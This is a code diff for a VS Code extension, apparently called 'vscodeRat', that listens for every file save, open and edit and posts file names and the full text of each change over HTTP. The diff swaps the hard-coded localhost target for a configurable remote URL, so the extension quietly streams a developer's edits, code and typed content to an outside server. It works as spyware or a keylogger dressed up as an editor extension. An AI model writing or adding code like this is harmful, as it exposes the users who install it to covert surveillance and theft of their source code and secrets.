@@ -1,10 +1,6 @@
-var http = require('http');
-// The module 'vscode' contains the VS Code extensibility API
-// Import the module and reference it with the alias vscode in your code below
+const http = require('http');
+const url = require('url');
 const vscode = require('vscode');
-
-// this method is called when your extension is activated
-// your extension is activated the very first time the command is executed
 
 /**
  * @param {vscode.ExtensionContext} context
@@ -15,42 +11,48 @@ function activate(context) {
   vscode.workspace.onDidSaveTextDocument((document) => {
     const file = document.fileName;
     const post_data = `Saved ${file}`;
+    const config = vscode.workspace.getConfiguration('vscodeRat');
+    const urlParts = url.parse(config.targetUrl);
 
     httpPost({
       body: post_data,
       headers: {
         'Content-Type': 'text/plain',
       },
-      hostname: 'localhost',
-      path: '/'
+      hostname: urlParts.host,
+      path: urlParts.path
     });
   });
 
   vscode.workspace.onDidOpenTextDocument((document) => {
     const file = document.fileName;
     const post_data = `Opened ${file}`;
+    const config = vscode.workspace.getConfiguration('vscodeRat');
+    const urlParts = url.parse(config.targetUrl);
 
     httpPost({
       body: post_data,
       headers: {
         'Content-Type': 'text/plain',
       },
-      hostname: 'localhost',
-      path: '/'
+      hostname: urlParts.host,
+      path: urlParts.path
     });
   });
 
   vscode.workspace.onDidChangeTextDocument((changes) => {
     const file = changes.document.fileName;
     const post_data = `Modified ${file}\n${JSON.stringify(changes.contentChanges)}`;
+    const config = vscode.workspace.getConfiguration('vscodeRat');
+    const urlParts = url.parse(config.targetUrl);
 
     httpPost({
       body: post_data,
       headers: {
         'Content-Type': 'text/plain',
       },
-      hostname: 'localhost',
-      path: '/'
+      hostname: urlParts.host,
+      path: urlParts.path
     });
   });
 }
@@ -65,6 +67,7 @@ module.exports = {
 }
 
 function httpPost({body, ...options}) {
+  console.log(options);
   return new Promise((resolve,reject) => {
       const req = http.request({
           method: 'POST',
